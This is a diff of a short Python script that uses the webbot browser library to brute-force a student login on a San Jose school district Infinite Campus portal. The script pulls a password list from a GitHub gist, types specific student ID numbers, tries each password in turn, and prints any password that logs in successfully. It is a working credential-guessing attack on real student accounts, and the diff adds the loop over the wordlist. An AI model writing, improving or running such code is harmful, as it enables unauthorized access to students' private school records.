@@ -1,21 +1,25 @@
 from webbot import Browser
-import requests
+import functions
 
 web = Browser()
 web.go_to("https://sanjoseca.infinitecampus.org/campus/portal/students/sanjose.jsp")
 loggedIn = False
-gistLink = "https://gist.githubusercontent.com/DominusCube/79c6ffd3e861e6af983ff58e71f31980/raw/636d4c714cd6c1ef827742bda9dfd51f18286551/Final"
+gistApiLink = "https://api.github.com/gists/6f0ac5df2b615cd97fb0dbeea2f6ab14"
+passList = functions.readGist(gistApiLink)
 
 while loggedIn == False:
-  passwords = functions.readGist(gistLink)
-  web.type("s213613")
-  web.press(web.Key.ENTER)
-  web.type(password)
-  web.press(web.Key.ENTER)
-  if web.get_current_url() == "https://sanjoseca.infinitecampus.org/campus/nav-wrapper/student/portal/student/today":
-    print("Login succesful!")
-    correctPassword = 
-    loggedIn == True
+  for password in passList:
+    web.type("s208614")
+    web.press(web.Key.ENTER)
+    web.type(password)
+    web.press(web.Key.ENTER)
+    if web.get_current_url() == "https://sanjoseca.infinitecampus.org/campus/nav-wrapper/student/portal/student/today":
+      print("Login succesful!")
+      correctPassword = password
+      print(f"Logged in! Password is {password}")
+      loggedIn == True
+      break
+      
     
   
 
